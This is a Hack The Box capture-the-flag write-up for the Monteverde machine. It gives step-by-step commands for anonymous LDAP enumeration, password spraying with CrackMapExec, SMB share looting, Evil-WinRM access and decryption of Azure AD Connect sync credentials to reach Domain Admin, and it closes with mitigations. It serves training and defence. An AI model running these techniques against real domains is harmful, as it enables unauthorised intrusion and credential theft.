# Monteverde - Hack The Box

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)

---

# Machine Information

| Machine | Monteverde |
|----------|------------|
| Operating System | Windows |
| Difficulty | Medium |
| Target IP | 10.129.228.111 |

---

# Overview

Monteverde is a medium-difficulty Windows machine focused on Active Directory enumeration, password spraying, SMB share enumeration, and Azure AD Connect credential extraction.

The attack begins with anonymous LDAP enumeration, which allows us to collect valid domain users without authentication. Since the domain does not enforce an account lockout policy, password spraying becomes a viable attack vector. A successful spray compromises a service account that grants access to shared SMB resources, where sensitive Azure configuration files are exposed.

The recovered credentials belong to a user with WinRM access to the Domain Controller. During post-exploitation, the presence of Azure AD Connect reveals an opportunity to recover synchronization credentials stored within the ADSync database, ultimately leading to Domain Administrator privileges.

---

# Skills Learned

- Active Directory Enumeration
- LDAP Anonymous Bind
- Password Spraying
- SMB Enumeration
- Azure AD Connect Enumeration
- SQL Database Enumeration
- WinRM Lateral Access
- Credential Extraction
- Privilege Escalation in Active Directory

---

# Attack Path

1. Perform service enumeration with Nmap.
2. Identify the target as a Domain Controller.
3. Enumerate Active Directory users through anonymous LDAP bind.
4. Build a valid username list.
5. Perform a password spraying attack.
6. Obtain credentials for the `SABatchJobs` service account.
7. Enumerate SMB shares.
8. Discover an Azure configuration file inside the `users$` share.
9. Recover credentials stored in `azure.xml`.
10. Authenticate as `mhope` using Evil-WinRM.
11. Enumerate Azure AD Connect installation.
12. Query the ADSync database.
13. Extract synchronization credentials.
14. Authenticate as `Administrator`.
15. Capture the root flag.

---

# Enumeration

## Nmap Scan

As always, the first step is to identify all exposed TCP services running on the target machine.

```bash
nmap -sV -sC -sS -p- --min-rate 5000 10.129.228.111 -oN nmap
```

### Evidence

<img width="954" height="809" alt="image" src="https://github.com/user-attachments/assets/1411039f-24c0-47e0-b8da-4c145d846a58" />


### Findings

The scan reveals several services commonly found on an Active Directory Domain Controller.

| Port | Service |
|------|----------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | RPC |
| 139 | NetBIOS |
| 389 | LDAP |
| 445 | SMB |
| 464 | Kerberos Password Change |
| 593 | RPC over HTTP |
| 636 | LDAPS |
| 3268 | Global Catalog |
| 3269 | Global Catalog SSL |
| 5985 | WinRM |

Nmap also identifies the domain name:

```
MEGABANK.LOCAL
```

At this point we can confidently conclude that the target is functioning as a Domain Controller.

---

# Anonymous LDAP Enumeration

Since the target exposes LDAP, it is worth checking whether anonymous binds are allowed.

Anonymous LDAP access can sometimes disclose valuable information about the Active Directory environment without requiring valid credentials.

Download **windapsearch**.

```bash
wget https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py
```

Attempt an anonymous LDAP bind.

```bash
python3 windapsearch.py -u "" --dc-ip 10.129.228.111
```

The bind succeeds successfully, confirming that anonymous LDAP queries are permitted.

This allows us to enumerate users without authentication.

---

# User Enumeration

Retrieve every domain user.

```bash
python3 windapsearch.py -u "" --dc-ip 10.129.228.111 -U --admin-objects
```

### Evidence

Among the discovered accounts, several immediately stand out.

```
Guest
AAD_987d7f2f57d2
SABatchJobs
mhope
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
<img width="143" height="213" alt="image" src="https://github.com/user-attachments/assets/1725a888-000e-4994-90a5-4fdf4b657340" />


Some observations can already be made.

The presence of the account:

```
AAD_987d7f2f57d2
```

strongly suggests that **Azure AD Connect** is installed in the environment.

Likewise, the account:

```
SABatchJobs
```

appears to be a service account, making it a strong candidate for password spraying attacks since service accounts frequently use weak or predictable passwords.

---

# Checking Remote Management Users

Before obtaining credentials, it is useful to determine whether any users belong to the **Remote Management Users** group.

Members of this group are allowed to authenticate through WinRM, which may provide remote PowerShell access later in the attack.

Execute:

```bash
python3 windapsearch.py -u "" --dc-ip 10.129.228.111 -U -m "Remote Management Users"
```

The enumeration reveals that the user:

```
mhope
```

belongs to the **Remote Management Users** group.

This information becomes extremely valuable because if credentials for this account are recovered later, WinRM will likely provide an immediate shell on the Domain Controller.

---

# SMB Enumeration

Next, verify whether SMB allows anonymous authentication.

```bash
smbclient -L //10.129.228.111 -N
```

Although authentication succeeds anonymously, share enumeration is unsuccessful.

This indicates that anonymous sessions are permitted but lack sufficient privileges to enumerate accessible resources.

To gather additional information about the domain, execute:

```bash
enum4linux -a 10.129.228.111
```

### Evidence

Among the collected information, one configuration immediately stands out.

```
Account Lockout Threshold : None
```

This means there is **no account lockout policy** configured within the domain.

Without an account lockout threshold, password spraying becomes a safe attack because repeated authentication failures will not lock user accounts.

---

# Preparing Password Spraying

Generate a clean list containing every discovered username.

```bash
python3 windapsearch.py -u "" --dc-ip 10.129.228.111 -U \
| grep '@' \
| cut -d ' ' -f2 \
| cut -d '@' -f1 \
| uniq > userlist
```

Review the generated list.

```bash
cat userlist
```

Next, download a common weak password list.

```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
```

Append the usernames to the password list.

```bash
cat userlist >> english-basic.txt
```

This slightly increases the probability of discovering credentials because organizations frequently reuse usernames as passwords for service accounts.

The environment is now ready for the password spraying attack.

---

# Password Spraying

Since the domain does not enforce an account lockout policy, we can safely perform a password spraying attack against every discovered user.

Rather than using a large password list, we'll use a small collection of common corporate passwords and append the discovered usernames, as organizations sometimes configure service accounts with passwords identical to their usernames.

Execute CrackMapExec:

```bash
crackmapexec smb 10.129.228.111 \
-d MEGABANK \
-u userlist \
-p english-basic.txt
```
<img width="951" height="777" alt="image" src="https://github.com/user-attachments/assets/1627d087-d019-4002-a141-75adfbcf36b2" />

<img width="942" height="119" alt="image" src="https://github.com/user-attachments/assets/db11cec6-a1e2-4090-a4ca-bf6beaa960c6" />


After several authentication attempts, one account successfully authenticates.

```
MEGABANK\SABatchJobs:SABatchJobs
```

We now have our initial set of valid domain credentials.

| Username | Password |
|----------|----------|
| SABatchJobs | SABatchJobs |

Although these credentials do not immediately provide remote code execution, they are sufficient to continue enumerating internal resources within the domain.

---

# SMB Share Enumeration

Using the newly obtained credentials, enumerate every available SMB share.

```bash
smbmap -H 10.129.228.111 -u SABatchJobs -p SABatchJobs -d megabank.local
```

<img width="945" height="604" alt="image" src="https://github.com/user-attachments/assets/9da6026c-ce9e-4331-af35-a21565fffcda" />


Several accessible shares are returned.

The most interesting one is:

```
users$
```

Since service accounts frequently have read access to shared folders, this location becomes an excellent candidate for searching sensitive information.

---

# Searching for Interesting Files

Instead of manually browsing every directory, use **smbmap** to recursively search for potentially valuable documents.

```bash
smbmap -u SABatchJobs -p SABatchJobs -H 10.129.228.111 -r --exclude SYSVOL,IPC$
```

<img width="973" height="788" alt="image" src="https://github.com/user-attachments/assets/284f2287-d75f-4034-bec6-da742af9fb09" />


Among the discovered files, one immediately attracts attention.

```
azure.xml
```

Configuration files frequently contain credentials, connection strings, API tokens or other sensitive information.

Download the file for local inspection.

---

# Inspecting azure.xml

Open the downloaded file.

```bash
cat azure.xml
```

<img width="951" height="363" alt="image" src="https://github.com/user-attachments/assets/07b1e15e-a1c3-4560-880b-780c42d5f77d" />


Inside the XML document a plaintext password is discovered.

```xml
<Password>4n0therD4y@n0th3r$</Password>
```

This credential appears to belong to an Azure-related configuration.

At this stage there is no guarantee that the password is reused elsewhere, but password reuse is extremely common inside enterprise environments.

One user discovered during LDAP enumeration immediately stands out.

```
mhope
```

Earlier we confirmed that this user belongs to the **Remote Management Users** group, meaning that valid credentials should allow authentication through WinRM.

The next logical step is therefore to test this password against the account.

---

# Initial Foothold

Attempt to authenticate through Evil-WinRM.

```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

<img width="962" height="243" alt="image" src="https://github.com/user-attachments/assets/a0a66a10-f648-41b0-9c3f-71ac0591e1a7" />


Authentication succeeds successfully.

We now have an interactive PowerShell session on the Domain Controller.

Verify the current user.

```powershell
whoami
```

Output:

```
megabank\mhope
```

---

# User Flag

Navigate to the Desktop directory.

```powershell
cd C:\Users\mhope\Desktop
```

List the contents.

```powershell
dir
```

Display the user flag.

```powershell
type user.txt
```

At this point we have achieved the **User** objective.

---

# Local Enumeration

Before attempting privilege escalation, gather information about the host.

Check the installed software.

```powershell
cd "C:\Program Files"
dir
```

Several interesting applications are installed.

```
Microsoft Azure Active Directory Connect
Microsoft Azure AD Sync
Microsoft SQL Server
```

The presence of **Azure AD Connect** is particularly important.

Azure AD Connect synchronizes identities between an on-premises Active Directory environment and Azure Active Directory.

To perform this synchronization, credentials must be securely stored on the system.

If those credentials can be recovered, they may belong to a highly privileged domain account.

This immediately becomes our primary privilege escalation path.

---

# Enumerating Azure AD Connect

Retrieve information about the ADSync service from the registry.

```powershell
Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

<img width="950" height="477" alt="image" src="https://github.com/user-attachments/assets/8f797d0c-44f6-4f70-a836-c6e96dd3a994" />


The registry reveals the executable responsible for the synchronization service.

```
C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe
```

Next, inspect the executable version.

```powershell
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-List -Property * -Force
```

<img width="951" height="803" alt="image" src="https://github.com/user-attachments/assets/fa761cb8-8eaf-4951-a7c0-fe62aced0348" />


Researching this version reveals that credentials are stored inside the ADSync database and can be recovered through PowerShell by interacting with the SQL backend.

The next step is to obtain the encryption parameters required to decrypt those credentials.

---

# Querying the ADSync Database

Azure AD Connect stores its synchronization configuration inside a SQL database named **ADSync**.

In order to decrypt the synchronization credentials, we first need to recover three values from the database:

- `instance_id`
- `keyset_id`
- `entropy`

Fortunately, the native **sqlcmd** utility is installed on the server, allowing us to query the database directly.

Execute the following command:

```powershell
sqlcmd -S MONTEVERDE -Q "USE ADSync; SELECT instance_id,keyset_id,entropy FROM mms_server_configuration"
```

<img width="962" height="150" alt="image" src="https://github.com/user-attachments/assets/ca809e3b-da4c-4bee-b71a-7d0e6cd6e135" />


The command returns values similar to the following:

```text
keyset_id     : 1

instance_id   : 1852B527-DD4F-4ECF-B541-EFCCBFF29E31

entropy       : 194EC2FC-F186-46CF-B44D-071EB61F49CD
```

These values will later be supplied to the PowerShell script responsible for decrypting the Azure AD Connect credentials.

---

# Preparing the Exploitation Script

Public research on Azure AD Connect shows that synchronization credentials can be decrypted using PowerShell.

However, the publicly available proof-of-concept assumes a default installation and automatically retrieves the required values from the database.

Since this machine uses a custom installation, the script must be modified manually.

Replace the automatically generated values with those previously extracted from SQL Server.

```powershell
$key_id = 1

$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"

$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
```

Next, modify the SQL connection string.

Original:

```powershell
Server=(localdb)\.\ADSync
```

Replace it with:

```powershell
Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true
```

Finally, wrap the script inside a reusable PowerShell function named:

```powershell
Get-ADConnectPassword
```

Save the modified script as:

```
adconnect.ps1
```

---

# Loading the Script

Evil-WinRM allows PowerShell scripts to be loaded directly into memory.

Reconnect while specifying the local script directory.

```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' -s .
```

Once connected, simply load the script.

```powershell
adconnect.ps1
```

No output is expected.

The script is now available in memory.

---

# Extracting Azure AD Connect Credentials

Execute the PowerShell function.

```powershell
Get-ADConnectPassword
```

After a few seconds, the script decrypts the synchronization credentials stored within Azure AD Connect.

Output resembles:

```text
Domain: MEGABANK.LOCAL

Username: Administrator

Password: d0m@in4dminyeah!
```

The recovered account corresponds to the synchronization account used by Azure AD Connect.

In this particular environment, the synchronization account is the built-in **Domain Administrator**, immediately granting full control over the domain.

---

# Privilege Escalation

Using the recovered credentials, authenticate once again through Evil-WinRM.

```bash
evil-winrm -i 10.129.228.111 -u Administrator -p 'd0m@in4dminyeah!'
```

Verify the current user.

```powershell
whoami
```

Output:

```
megabank\administrator
```

<img width="955" height="254" alt="image" src="https://github.com/user-attachments/assets/fce5d083-5bb1-4db2-a491-3a509f1d8c36" />


At this point we have obtained full administrative privileges over the Domain Controller.

---

# Root Flag

Navigate to the Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
```

Display the root flag.

```powershell
type root.txt
```

The machine has now been fully compromised.

---

# Post-Exploitation Summary

| Stage | Result |
|---------|--------|
| Anonymous LDAP | Successful |
| User Enumeration | Successful |
| Password Spraying | Successful |
| Initial Credentials | SABatchJobs |
| SMB Enumeration | Successful |
| Sensitive File Discovery | azure.xml |
| Password Reuse | mhope |
| WinRM Access | Successful |
| Azure AD Connect Enumeration | Successful |
| ADSync Database Enumeration | Successful |
| Credential Decryption | Successful |
| Privilege Escalation | Administrator |

---

# Attack Chain

```
Anonymous LDAP
        │
        ▼
User Enumeration
        │
        ▼
Password Spraying
        │
        ▼
SABatchJobs Credentials
        │
        ▼
SMB Share Enumeration
        │
        ▼
azure.xml
        │
        ▼
Password Disclosure
        │
        ▼
WinRM as mhope
        │
        ▼
Azure AD Connect Enumeration
        │
        ▼
SQL Database Enumeration
        │
        ▼
Credential Decryption
        │
        ▼
Administrator
```

---

# Security Issues Identified

- Anonymous LDAP enumeration enabled.
- Lack of an account lockout policy.
- Weak password assigned to a service account.
- Password reuse across different accounts.
- Sensitive Azure configuration file stored in a readable SMB share.
- Azure AD Connect credentials recoverable from the ADSync database.
- Excessive privileges assigned to synchronization credentials.

---

# Mitigations

- Disable anonymous LDAP binds whenever possible.
- Enforce a strict account lockout policy.
- Require strong passwords for service accounts.
- Eliminate password reuse across the environment.
- Restrict read access to sensitive SMB shares.
- Protect Azure AD Connect credentials using the latest supported version.
- Monitor PowerShell execution and access to the ADSync database.
- Apply the principle of least privilege to synchronization accounts.

---

# MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|----------|-----------|------|
| Discovery | Network Service Scanning | T1046 |
| Discovery | Domain Account Discovery | T1087.002 |
| Credential Access | Password Spraying | T1110.003 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credentials from Password Stores | T1555 |
| Lateral Movement | Remote Services (WinRM) | T1021.006 |
| Credential Access | Unsecured Credentials | T1552 |
| Credential Access | OS Credential Dumping | T1003 |
| Privilege Escalation | Valid Accounts | T1078 |

---

# Lessons Learned

Monteverde demonstrates how multiple low-severity misconfigurations can be chained together to completely compromise an Active Directory environment.

Anonymous LDAP access exposes valid usernames without authentication, while the absence of an account lockout policy makes password spraying a practical attack. Weak service account credentials then provide access to SMB shares containing sensitive configuration files. Password reuse allows lateral movement through WinRM, and Azure AD Connect ultimately exposes highly privileged synchronization credentials stored within the ADSync database.

Although none of these weaknesses alone would necessarily lead to domain compromise, their combination illustrates the importance of defense in depth and secure configuration management within enterprise Active Directory environments.
